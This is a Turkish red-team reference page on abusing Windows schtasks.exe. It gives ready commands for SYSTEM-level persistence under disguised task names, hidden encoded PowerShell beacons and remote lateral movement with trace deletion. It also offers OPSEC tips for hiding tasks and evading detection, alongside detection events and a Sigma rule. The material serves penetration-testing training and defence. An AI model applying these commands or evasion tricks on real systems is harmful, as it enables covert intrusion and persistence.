# schtasks.exe

> **Kategori:** [2. WINDOWS YEREL KOMUT SATIRI VE LOLBINS (NATIVE WINDOWS & SYSINTERNALS)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows Görev Zamanlayıcısı CLI LOLBin aracı; yerel ve uzaktan zamanlanmış görev oluşturma (`schtasks /create`), tetikleme (`/run`), sorgulama (`/query`) ve kalıcılık (persistence) sağlama.

---

## 1. Genel Bakış ve Amaç

`schtasks.exe`, Windows 2000'den bu yana tüm Windows işletim sistemlerinde varsayılan olarak (`C:\Windows\System32\schtasks.exe`) bulunan ve **Windows Görev Zamanlayıcısı Hizmeti (Task Scheduler Service - `Schedule`)** ile komut satırından etkileşime geçen yerleşik yönetim aracıdır.

Saldırganlar ve Red Team operatörleri için `schtasks.exe`, Active Directory sızma testlerinde iki ana taktiksel amaca hizmet eder:
1. **Kalıcılık Sağlama (Persistence - T1053.005):** Sistem her açıldığında (`ONSTART`), kullanıcı oturum açtığında (`ONLOGON`) veya belirli aralıklarla (dakika/saat) arka planda C2 ajanını veya yetki yükseltme yükünü tetikleyen görevler kurmak.
2. **Yanal Hareket (Lateral Movement via atexec):** Ağ üzerindeki uzak bir Windows makinesinde (`schtasks /s <Sunucu> /create ...`) etki alanı yöneticisi kimliğiyle yeni bir görev tanımlayıp anında çalıştırarak (`/run`) dosyasız komut yürütmek (Impacket `atexec.py` metodolojisi).

### Protokol ve Çalışma Prensibi

`schtasks.exe`, yerel ve uzaktan çalışırken Windows'un **MS-TSCH (Task Scheduler Service Remoting Protocol)** standardını ve **MSRPC** (TCP 135 ve Dinamik Portlar / SMB Named Pipe: `\pipe\atsvc`) arayüzünü kullanır:

```
┌──────────────────────────────────────────────────────────────┐
│                    Saldırgan İstemcisi                       │
│                      [ schtasks.exe ]                        │
└──────────────────────────────┬───────────────────────────────┘
                               │
            Yerel: LPC / ALPC  │ Uzak: MSRPC / RPC over SMB
            ITaskService API   │ TCP 135 / Dinamik Portlar
                               │ Named Pipe: \pipe\atsvc
                               ▼
┌──────────────────────────────────────────────────────────────┐
│               Görev Zamanlayıcısı Hizmeti                    │
│             [ svchost.exe (Schedule Service) ]               │
│                                                              │
│  - Disk Tanımı: C:\Windows\System32\Tasks\<GörevAdı> (XML)   │
│  - Kayıt Defteri: HKLM\SOFTWARE\Microsoft\Windows NT\        │
│                   CurrentVersion\Schedule\TaskCache\...      │
│  - Çalışma Bağlamı: SYSTEM / User / High Integrity (/rl)     │
└──────────────────────────────┬───────────────────────────────┘
                               │
         (A) Görev Tetikleme: Doğrudan veya Zaman Aşımı
         Süreç Belirtilen Kullanıcı Bağlamında Başlatılır!
                               ▼
┌──────────────────────────────────────────────────────────────┐
│                    Yürütülen Yük (Payload)                   │
│       powershell.exe -w hidden -enc <Base64_Payload>         │
└──────────────────────────────────────────────────────────────┘
```

1. **XML ve Kayıt Defteri Mimarisi:** Windows'ta tanımlanan her zamanlanmış görev, `C:\Windows\System32\Tasks\` dizini altında uzantısız bir XML dosyası olarak diske yazılır. Eşzamanlı olarak `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\` dalında görevin adı ve `TaskCache\Tasks\` altında görevin GUID anahtarı oluşturulur.
2. **Yetki ve Bütünlük Düzeyi (Privilege & Integrity):** `/ru SYSTEM` parametresiyle oluşturulan görevler, doğrudan yerel sistemin en yetkili hesabı olan `NT AUTHORITY\SYSTEM` bağlamında çalışır. `/rl HIGHEST` parametresi ise görevin UAC kısıtlamasına takılmadan **High Mandatory Level** (Yükseltilmiş) olarak başlatılmasını garanti eder.
3. **Uzak Yanal Hareket Mekanizması:** `/s <Hedef>` bayrağı kullanıldığında, istemci uzak makinenin Görev Zamanlayıcı RPC arayüzüne bağlanır. Saldırgan görevi kurar (`/create`), zorla başlatır (`/run`) ve çıktıyı elde ettikten sonra görevi silerek (`/delete`) PsExec'e göre daha az iz bırakan bir yanal hareket gerçekleştirir.

### Neden Önemli?

| Kullanım Senaryosu | Açıklama |
|---|---|
| **SYSTEM Seviyesinde Kalıcılık** | Sistem açılışında (`ONSTART`) veya belirli saatlerde çalışan kalıcı arka kapı mekanizması kurma. |
| **Uzak Komut Yürütme (atexec)** | Uzak sunucularda servis (SCM) kurmaya gerek kalmadan görev zamanlayıcı üzerinden yanal hareket yapma. |
| **UAC Bypass ile Kod Çalıştırma** | `/rl HIGHEST` bayrağı ile kısıtlı yönetici oturumlarında komutları UAC penceresi çıkarmadan yükseltilmiş çalıştırma. |
| **Zamanlı Tetikleme (Time-Bomb Payload)** | Saldırının belirli bir gün/saatte başlamasını sağlayarak savunma ekiplerinin dikkatini dağıtma. |
| **Sistem Görevlerini Denetleme** | Sistemde kayıtlı 3. parti görevleri listeleyip çalıştırılan ikili dosya izinlerindeki açıkları avlama. |

### Alternatif Araçlarla Karşılaştırma

| Kriter / Yetenek | `schtasks.exe` | `at.exe` (Eski Windows) | `PowerShell (*-ScheduledTask)` | `atexec.py (Impacket)` |
|---|---|---|---|---|
| **Varsayılan Bulunabilirlik** | Tüm Windows sürümlerinde hazır | Windows 8+ öncesi (Artık yok) | Windows 8 / Server 2012+ | Harici Linux aracı |
| **Kullandığı Protokol** | MSRPC (Task Scheduler RPC) | NetrJobAdd (Eski RPC) | WMI / CIM / Task RPC | MS-TSCH (MSRPC) |
| **Tetikleyici Esnekliği** | Çok Yüksek (OnStart, OnLogon vb.) | Yalnızca Saat Bazlı | Çok Yüksek | Tek Atımlık (Once) |
| **Uzak Yönetim** | Var (`/s <sunucu>`) | Var | Var (`-CimSession`) | Var (Otomatikleştirilmiş) |
| **EDR Algısı** | `/ru SYSTEM` ve `/create` izlenir | Engellenir / Yok | Script Block Logging | MSRPC anomalisi |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

### Genel Sözdizimi

```cmd
schtasks /create [seçenekler]
schtasks /run /tn <GörevAdı> [/s <Sunucu>]
schtasks /query [/s <Sunucu>] [/fo {TABLE | LIST | CSV}] [/v]
schtasks /delete /tn <GörevAdı> [/s <Sunucu>] [/f]
schtasks /end /tn <GörevAdı> [/s <Sunucu>]
```

### Kritik Parametreler ve Açıklamaları

| Parametre | Açıklama | Örnek Kullanım |
|---|---|---|
| `/tn <GörevAdı>` | Görevin benzersiz adını veya yolunu belirtir. | `/tn "Microsoft\Windows\DefenderUpdate"` |
| `/tr <Komut/Yol>` | Görev çalıştığında yürütülecek program, komut veya betik yolu. | `/tr "C:\Temp\agent.exe"` |
| `/sc <Zamanlama>` | Tetikleyici türü: `MINUTE`, `HOURLY`, `DAILY`, `WEEKLY`, `ONSTART`, `ONLOGON`, `ONIDLE`, `ONCE`. | `/sc ONSTART` |
| `/mo <Değer>` | Zamanlama sıklığı çarpanı (Örn: Her 5 dakikada bir, her 2 günde bir). | `/sc MINUTE /mo 15` |
| `/st <Saat>` | Görevin başlama saati (`HH:mm` formatında, 24 saat). | `/st 14:30` |
| `/sd <Tarih>` | Görevin başlama tarihi (`GG/AA/YYYY` formatında). | `/sd 20/10/2026` |
| `/ru <Kullanıcı>` | Görevin çalışacağı hesap (`SYSTEM`, `LocalService`, `NetworkService` veya `DOMAIN\User`). | `/ru SYSTEM` |
| `/rp <Parola>` | Görev hesabı için parola (SYSTEM için parola gerekmez). | `/rp "P@ss123!"` |
| `/rl <Seviye>` | Çalışma düzeyi: `LIMITED` (standart kullanıcı) veya `HIGHEST` (yükseltilmiş yönetici). | `/rl HIGHEST` |
| `/s <Sunucu>` | Komutun uygulanacağı uzak sistemin adı veya IP adresi. | `/s DC01.lab.local` |
| `/u` ve `/p` | Uzak sistem sorgusu veya yönetimi için kimlik bilgisi. | `/u LAB\admin /p Secret123!` |
| `/f` | Mevcut görevin üzerine yazmayı veya onay sormadan silmeyi zorlar (Force). | `/f` |
| `/fo <Format>` | Çıktı formatı: `TABLE`, `LIST` veya `CSV`. | `/fo CSV /v` |
| `/xml <Dosya>` | Görevi harici bir XML dosyasından içe aktararak oluşturur. | `schtasks /create /xml task.xml /tn MyTask` |

### Modül ve Yetenek Şeması

```
schtasks.exe Yetenek Ağacı
├── 1. Görev Oluşturma (Persistence & Execution)
│   ├── /sc ONSTART /ru SYSTEM /rl HIGHEST  (Sistem başlangıcı / SYSTEM kalıcılık)
│   ├── /sc ONLOGON                         (Kullanıcı oturumu kalıcılık)
│   └── /sc MINUTE /mo 30                   (Periyodik C2 beacon tetikleme)
├── 2. Yanal Hareket (Remote Execution)
│   ├── schtasks /s <Sunucu> /create        (Uzak sistemde görev tanımlama)
│   ├── schtasks /s <Sunucu> /run           (Görevi uzaktan çalıştırma)
│   └── schtasks /s <Sunucu> /delete        (İzleri temizleme)
├── 3. Keşif ve Görev Analizi
│   ├── schtasks /query /fo CSV /v          (Tüm görevleri detaylı dökme)
│   └── schtasks /query /tn <Ad>            (Hedef görevin durumunu inceleme)
└── 4. Görev Yaşam Döngüsü Kontrolü
    ├── schtasks /run                       (Zamanı beklemeden çalıştırma)
    ├── schtasks /end                       (Çalışan görevi durdurma)
    └── schtasks /delete /f                 (Görevi tamamen kaldırma)
```

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Kalıcılık — Sistem Başlangıcında SYSTEM Yetkisinde Çalışan Görev

Saldırgan makinede kalıcılık sağlamak için makine açıldığında kullanıcı oturumu gerekmeksizin çalışan bir görev tanımlar:

```cmd
schtasks /create /tn "SecurityHealthServiceUpdate" /tr "C:\Windows\Temp\beacon.exe" /sc ONSTART /ru SYSTEM /rl HIGHEST /f
```

**Örnek Çıktı Analizi:**
```text
SUCCESS: The scheduled task "SecurityHealthServiceUpdate" has successfully been created.
```
- `/sc ONSTART`: Makine yeniden başladığı an Windows henüz oturum açma ekranındayken yük çalışır.
- `/ru SYSTEM`: Yük en yüksek ayrıcalık olan `NT AUTHORITY\SYSTEM` bağlamında çalışır.
- `/rl HIGHEST`: UAC kısıtlamalarını devre dışı bırakır.

---

### Senaryo 2: Uzak Sistemde Manuel atexec Yanal Hareketi

Etki alanı yöneticisi haklarıyla uzak bir sunucuda (`DC01.lab.local`) komut çalıştırmak ve ardından izleri temizlemek:

```cmd
:: 1. Uzak makinede tek seferlik bir görev oluştur
schtasks /s DC01.lab.local /create /tn "CorpDiagnosticTask" /tr "cmd.exe /c whoami /all > C:\Windows\Temp\output.txt" /sc ONCE /st 00:00 /ru SYSTEM /rl HIGHEST /f

:: 2. Görevi anında tetikle (Zamanı beklemeden)
schtasks /s DC01.lab.local /run /tn "CorpDiagnosticTask"

:: 3. Çıktıyı uzak C$ paylaşımından oku
type \\DC01.lab.local\C$\Windows\Temp\output.txt

:: 4. Görevi silerek izleri temizle
schtasks /s DC01.lab.local /delete /tn "CorpDiagnosticTask" /f
```

Bu adım dizisi, Impacket `atexec.py` aracının arka planda SMB ve RPC üzerinden yürüttüğü mantığın birebir yerel LOLBin karşılığıdır!

---

### Senaryo 3: Kullanıcı Her Oturum Açtığında Çalışan Görev (Kullanıcı Kalıcılığı)

Belirli bir kullanıcının her oturum açışında çalışan ve dosyasız PowerShell yükü tetikleyen görev:

```cmd
schtasks /create /tn "UserEnvironmentSync" /tr "powershell.exe -WindowStyle Hidden -NoP -Enc SQBFAFgAIAA..." /sc ONLOGON /f
```

---

### Senaryo 4: Mevcut Görevleri Ayrıntılı Listeleme ve Şüpheli Görevleri Avlama

Sistemde çalışan tüm görevleri ayrıntılı olarak CSV formatında dökmek ve şüpheli dizinleri (`Temp`, `Users`, `AppData`) filtrelemek:

```cmd
schtasks /query /fo CSV /v | findstr /I "Temp AppData Users"
```

---

### Senaryo 5: XML Şablonu ile Gelişmiş Görev Oluşturma

Saldırgan komut satırı argümanı bırakmamak için tüm görev yapılandırmasını bir XML dosyasına yazar ve tek komutla içe aktarır:

```cmd
schtasks /create /xml C:\Windows\Temp\task.xml /tn "CustomTask" /f
```

---

### Senaryo 6: Görevi Zamanını Beklemeden Manuel Başlatma ve Durdurma

```cmd
:: Manuel Başlat
schtasks /run /tn "SecurityHealthServiceUpdate"

:: Çalışan Görevi Sonlandır
schtasks /end /tn "SecurityHealthServiceUpdate"
```

---

### Senaryo 7: PowerShell ile Görev Dosyalarını Tarayıp Zayıf İzinli Yolları Bulan Betik

`C:\Windows\System32\Tasks` altındaki XML dosyalarını doğrudan ayrıştırıp yürütülen ikili dosya izinlerini denetleyen operasyonel betik:

```powershell
# Sistemdeki görevleri ve çalıştırdıkları komutları XML'den okuyan betik:
$Tasks = Get-ChildItem -Path "C:\Windows\System32\Tasks" -Recurse -File

$Report = foreach ($task in $Tasks) {
    try {
        [xml]$xml = Get-Content $task.FullName -ErrorAction Stop
        $action = $xml.Task.Actions.Exec.Command
        $args = $xml.Task.Actions.Exec.Arguments
        $user = $xml.Task.Principals.Principal.UserId
        
        [PSCustomObject]@{
            TaskName = $task.Name
            Command  = "$action $args"
            RunAs    = if ($user) { $user } else { "Interactive/Users" }
            IsSuspicious = if ($action -match 'Temp|AppData|Public|powershell|cmd') { "YES" } else { "NO" }
        }
    } catch {}
}
$Report | Where-Object { $_.IsSuspicious -eq "YES" } | Format-Table -AutoSize
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı | Olası Neden | Çözüm Adımı |
|---|---|---|
| `ERROR: Access is denied.` | `/ru SYSTEM` veya `/rl HIGHEST` parametreleri yerel yönetici ayrıcalığı gerektirir ya da uzak makineye erişim yetkisi yetersizdir. | Komut istemcisini "Run as Administrator" olarak açın veya uzak makineye bağlanırken etki alanı yöneticisi kimliği kullanın (`/u` ve `/p`). |
| `ERROR: The network path was not found.` | `/s <Sunucu>` parametresi kullanıldığında uzak makineye ağ üzerinden (RPC / Port 135 / Dinamik Portlar) ulaşılamamaktadır. | DNS çözümlemesini ve IP erişilebilirliğini kontrol edin; hedefte Windows Güvenlik Duvarı Uzaktan Görev Yönetimi (Remote Scheduled Tasks Management) kuralını doğrulayın. |
| `ERROR: User credentials required for this schedule type.` | `/sc ONSTART` gibi kullanıcı oturumu olmadan çalışacak bir görev tanımlanırken `/ru SYSTEM` bayrağı unutulmuştur. | Komuta açıkça `/ru SYSTEM` parametresini ekleyin; SYSTEM hesabı parola gerektirmez. |
| `ERROR: Cannot create a task with an account name different from the current user without a password.` | Farklı bir kullanıcı adı (`/ru <User>`) girilmiş ancak parola (`/rp`) sağlanmamıştır. | Belirtilen kullanıcının parolasını `/rp <Parola>` ile sağlayın veya parolasız çalışan `/ru SYSTEM` kullanın. |
| `ERROR: No mapping between account names and security IDs was done.` | Belirtilen kullanıcı adı veya etki alanı adı Active Directory'de bulunamamıştır. | Kullanıcı adını etki alanıyla birlikte tam formatta yazın: `/ru "LAB\jdoe"`. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Artifacts & Logs)

- **Windows Güvenlik Olay Günlükleri (Security Log):**
  - **Event ID 4698 (A scheduled task was created):** Yeni bir görev oluşturulduğunda görevin tam XML tanımı, görevi oluşturan kullanıcının SID'si ve çalıştırılacak komut (`TaskContent`) ile birlikte kaydedilir. SOC ekiplerinin en çok alarm kuralı yazdığı olay kimliğidir!
  - **Event ID 4699 (A scheduled task was deleted):** Görev silindiğinde (`/delete`) kaydedilir.
  - **Event ID 4702 (A scheduled task was updated):** Mevcut bir görev güncellendiğinde oluşur.
- **Görev Zamanlayıcısı Olay Günlükleri (`Microsoft-Windows-TaskScheduler/Operational`):**
  - **Event ID 106 (Task scheduled):** Görevin başarıyla zamanlandığını belirtir.
  - **Event ID 200 (Action executed):** Görevin tetiklendiğini ve komutun yürütüldüğünü kaydeder.
- **Uç Nokta Süreç Günlükleri:**
  - **Event ID 4688 / Sysmon Event ID 1 (Process Creation):** `schtasks.exe /create` komut satırı argümanları kaydedilir.
- **Disk ve Kayıt Defteri İzleri:**
  - `C:\Windows\System32\Tasks\<GörevAdı>` dosyası oluşturulur (Sysmon Event ID 11 - File Create).
  - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\<GörevAdı>` kayıt defteri anahtarı açılır.

### 5.2 Ağ ve EDR İmzaları

- **MSRPC Ağ Anomalisi:** `schtasks /s` kullanımı, istemciden hedefe doğru TCP 135 ve dinamik RPC portlarında yoğun MSRPC trafiği (`ITaskSchedulerService`) oluşturur. Zeek ve NDR sensörleri uzaktan görev oluşturma girişimini kolayca raporlar.
- **EDR Komut Satırı Tespiti:** Komut satırında `schtasks.exe` ile `/create` bayrağının ardından `powershell`, `cmd`, `certutil` veya `Temp`, `AppData` yollarının geçmesi neredeyse tüm EDR'lar için doğrudan **Kritik Kalıcılık (Severity: High/Critical Persistence)** alarmıdır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1053.005** | Scheduled Task/Job: Scheduled Task | Sistemde kalıcılık sağlama veya yetki yükseltilmiş kod yürütme (`schtasks /create`). |
| **T1021.002** | Remote Services: SMB/Windows Admin Shares | Uzak sunucuda görev kurarak yanal hareket gerçekleştirme (`schtasks /s`). |
| **T1070.004** | Indicator Removal on Host: File Deletion | Operasyon bittiğinde görevi silerek iz temizliği yapma (`schtasks /delete`). |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Alternatif Teknik |
|---|---|
| **Event ID 4698 (Görev Oluşturma) Alarmı** | Sıfırdan yeni bir görev oluşturmak yerine, sistemde mevcut olan ancak nadiren çalışan meşru bir Windows görevinin XML tanımını güncelleyin veya eylemini (Action) geçici olarak değiştirin. |
| **Disk İzi Bırakmama (Ghost Tasks)** | Kayıt defterindeki `TaskCache\Tree\<GörevAdı>\SD` değerini silerek görevi `schtasks /query` listesinden gizleyin veya doğrudan hafıza içi COM nesneleri (`ITaskService`) ile çalışın. |
| **Komut Satırı Tespiti** | `schtasks.exe` komut satırını çağırmak yerine, doğrudan PowerShell veya C# üzerinden `New-Object -ComObject Schedule.Service` API çağrıları yapın. |

### 5.5 Savunma Karşılığı (Blue Team)

- **Event 4698 Denetimi:** GPO üzerinden `Audit Other Object Access Events` politikasını açarak Event ID 4698 kayıtlarını toplayın ve `TaskContent` içerisinde `powershell`, `cmd.exe`, `Temp`, `Public` geçen olaylara doğrudan alarm üretin.
- **Sigma Kuralı Mantığı:**
  ```yaml
  title: Scheduled Task Creation via SCHTASKS
  status: high
  logsource:
      category: process_creation
      product: windows
  detection:
      selection:
          Image|endswith: '\schtasks.exe'
          CommandLine|contains:
              - '/create'
          CommandLine|contains|any:
              - 'SYSTEM'
              - 'HIGHEST'
              - 'cmd.exe'
              - 'powershell'
              - 'Temp\'
              - 'AppData\'
      condition: selection
  ```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

### 6.1 Sistem Açılışında SYSTEM Olarak Çalışan Görev Kurma (Kalıcılık)
```cmd
schtasks /create /tn "SecurityHealthUpdate" /tr "C:\Windows\Temp\agent.exe" /sc ONSTART /ru SYSTEM /rl HIGHEST /f
```
- **Ne Yapar?** Sistem her yeniden başladığında kullanıcı oturumundan bağımsız olarak SYSTEM yetkisinde çalışan bir görev kurar.
- **Ne Zaman Kullanılır?** Hedef sistemde en yüksek yetkide kalıcı arka kapı elde etmek için.
- **Parametreler:** `/tn <Ad>`, `/tr <Yol>`, `/sc ONSTART` (Açılışta başla), `/ru SYSTEM` (SYSTEM yetkisi), `/rl HIGHEST` (UAC bypass), `/f` (Üzerine yaz).

### 6.2 Kullanıcı Oturum Açtığında Çalışan Görev Tanımlama
```cmd
schtasks /create /tn "UserInitSync" /tr "C:\Users\Public\script.bat" /sc ONLOGON /f
```
- **Ne Yapar?** Herhangi bir kullanıcı masaüstü oturumu açtığında belirtilen betiği yürütür.
- **Ne Zaman Kullanılır?** Kullanıcı bağlamında çalışan C2 beacon veya kimlik tuzağı çalıştırmak için.
- **Parametreler:** `/sc ONLOGON` (Oturum açılışında tetiklenir).

### 6.3 Her Saat Başı Çalışan Periyodik Görev Oluşturma
```cmd
schtasks /create /tn "HourlyTelemetry" /tr "powershell.exe -w hidden -enc SQBFA..." /sc HOURLY /mo 1 /f
```
- **Ne Yapar?** Belirtilen gizli PowerShell komutunu her saat başı düzenli olarak tetikler.
- **Ne Zaman Kullanılır?** Periyodik geri dönüş (beaconing) veya zamanlanmış veri sızdırma operasyonlarında.
- **Parametreler:** `/sc HOURLY`, `/mo 1` (Her 1 saatte bir).

### 6.4 Görevi Zamanını Beklemeden Anında Çalıştırma
```cmd
schtasks /run /tn "SecurityHealthUpdate"
```
- **Ne Yapar?** Zamanlanmış bir görevin bir sonraki tetiklenme süresini beklemeden o anda zorla çalıştırılmasını sağlar.
- **Ne Zaman Kullanılır?** Görev oluşturulduktan hemen sonra yükün devreye girdiğini doğrulamak için.
- **Parametreler:** `/run`, `/tn <GörevAdı>`.

### 6.5 Uzak Sunucuda Görev Oluşturarak Yanal Hareket (atexec)
```cmd
schtasks /s DC01.lab.local /create /tn "SetupDiagnostics" /tr "cmd.exe /c whoami > C:\Windows\Temp\out.txt" /sc ONCE /st 00:00 /ru SYSTEM /rl HIGHEST /f
```
- **Ne Yapar?** Ağ üzerindeki uzak sunucuda tek seferlik bir görev tanımlar.
- **Ne Zaman Kullanılır?** Uzak sistemde SYSTEM seviyesinde komut yürütmek için.
- **Parametreler:** `/s <Sunucu>` (Hedef makine adı/IP), `/sc ONCE` (Tek atımlık).

### 6.6 Oluşturulan Görevi Sistemden Silme (İz Temizliği)
```cmd
schtasks /delete /tn "SecurityHealthUpdate" /f
```
- **Ne Yapar?** Belirtilen görevi XML dosyası ve kayıt defteri anahtarlarıyla birlikte tamamen kaldırır.
- **Ne Zaman Kullanılır?** Operasyon tamamlandığında adli analiz izlerini temizlemek için.
- **Parametreler:** `/delete`, `/tn <GörevAdı>`, `/f` (Onaysız sil).

### 6.7 Tüm Görevleri Ayrıntılı CSV Olarak Listeleme
```cmd
schtasks /query /fo CSV /v
```
- **Ne Yapar?** Sistemdeki tüm kayıtlı görevleri, çalıştırdıkları komutları ve hesap bağlamlarını CSV formatında döker.
- **Ne Zaman Kullanılır?** Sistemdeki 3. parti veya savunmasız görevleri analiz etmek için.
- **Parametreler:** `/query`, `/fo CSV` (CSV biçimi), `/v` (Ayrıntılı mod).

### 6.8 Belirli Bir Görevin Durumunu ve Son Çalışma Zamanını İnceleme
```cmd
schtasks /query /tn "SecurityHealthUpdate" /fo LIST /v
```
- **Ne Yapar?** Yalnızca belirtilen görevin son çalışma zamanını, son çıkış kodunu (`Last Result: 0x0`) ve durumunu listeler.
- **Ne Zaman Kullanılır?** Görevin başarıyla tamamlanıp tamamlanmadığını denetlemek için.
- **Parametreler:** `/query`, `/tn <GörevAdı>`, `/fo LIST`.

---

## Kaynaklar

| Kaynak | Bağlantı |
|---|---|
| Microsoft Learn — schtasks command reference | [learn.microsoft.com](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks) |
| MS-TSCH: Task Scheduler Service Remoting Protocol | [learn.microsoft.com](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/) |
| MITRE ATT&CK T1053.005 (Scheduled Task) | [attack.mitre.org](https://attack.mitre.org/techniques/T1053/005/) |
| LOLBAS Project — schtasks.exe | [lolbas-project.github.io](https://lolbas-project.github.io/) |

---

> **Önceki:** [← sc.exe](./sc.md) · **Sonraki:** [wmic.exe →](./wmic.md)
